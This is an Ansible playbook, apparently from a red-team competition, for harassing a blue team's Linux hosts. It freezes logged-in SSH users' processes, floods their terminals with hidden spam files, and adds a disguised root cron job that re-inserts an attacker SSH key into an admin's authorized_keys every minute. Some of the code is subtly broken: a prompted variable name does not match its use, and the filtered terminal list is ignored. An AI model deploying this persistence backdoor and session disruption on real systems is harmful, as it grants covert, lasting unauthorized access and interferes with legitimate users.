---
-   name: Play in Blue's Face, Part A
    hosts: all
    become: yes
    vars:
    # Blue Team Subnet (Change)
      subnet_prefix: "129."
    # Folder of Spam Animation Files on Control Machine
      source_spam_folder: "/root/Red_Team_PIF_Distraction_Tool/spamination/"
    # Hide Copy of Spam Folder in Downloads or other location in Target Machine
      remote_spam_folder: "/usr/games/chumstuff/"
    # Initial.txt is the first animation played
      remote_spam_file: "initial_image.txt"
    # SSH Kkey of RedTeamBox
      redtool_ssh_key: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDr7RYMDKCraXtqxIZVrJw3A5I2A/toQG1yiJs4+UF2c root@bassbox"
    # Location of Target Machine Authourized Keys on Admin User
      remote_authorized_keys: "/home/mrkrabs/.ssh/authorized_keys"

    vars_prompt:
    # Script asks Red User for what animation file to display/send
      - name: excluded_terminal
        prompt: "Which terminals to exclude"
        private: false
        default: "pts/3"

  
    tasks:

    - name: Copy over Textfiles
    # Copy all Spam Animation Files on target machine
      ansible.builtin.copy:
        src: "{{ source_spam_folder }}"
        dest: "{{ remote_spam_folder }}"

    - name: Search for SSH Terminal Lines 
    # Searches "who" output for terminal lines belonging to logged in Blue SSH Users
      ansible.builtin.shell: |
        who | awk -v net="{{ subnet_prefix }}" '$0 ~ net && $1 != "kingneptune" && $1 != "paintythepirate" && $1 != "greyteamadmin" {print $2}'
    # Blue terminal lines saved in target_pts
      register: target_pts
      changed_when: false

    - name: Convert Excluded Terminals into a List
      ansible.builtin.set_fact:
        excluded_terminal_list: >-
          {{ excluded_terminals.split(',')
             | map('trim')
             | reject('equalto', '')
             | list }}

    - name: Filter Excluded Terminal Lines
      ansible.builtin.set_fact:
        target_pts_filtered: >-
          {{ target_pts.stdout_lines
             | reject('in', excluded_terminal_list)
             | list }}

    - name: Stop Any Processes on Filtered Terminal Line
    # Using target_pts, stop Blue users from using commands for a time
      ansible.builtin.shell: |
           (sudo pkill -STOP -t {{ item }} && sleep 20 && sudo pkill -CONT -t {{ item }}) &
    # Parenthesis and ampersand allow command to be background process
      loop: "{{ target_pts.stdout_lines }}"
      when: target_pts_filtered.stdout_lines | length > 0
      changed_when: false
    
    - name: Send Initial Animation
    # Flood Blue Users on machine with initial animation
      ansible.builtin.shell: |
        /usr/bin/cat {{remote_spam_folder}}{{ remote_spam_file }} | tee /dev/{{ item }} > /dev/null
      loop: "{{ target_pts.stdout_lines }}"
      when: target_pts_filtered.stdout_lines | length > 0
      changed_when: false


    - name: Cron Service Is Enabled
    # Ensure Cron Jobs can occure
      ansible.builtin.systemd_service:
        name: cron
        state: started
        enabled: true

    - name: SSH Key CronJob load
    # Use Cron Job so Red Team SSH key is always in Authorized files
      ansible.builtin.cron:
        name: "Just Flipping Some Patties"
        user: "root"
        minute: "*"
        job: >-
          grep -qxF "{{ redtool_ssh_key }}" {{ remote_authorized_keys }} || echo "{{ redtool_ssh_key }}" >> {{ remote_authorized_keys }}
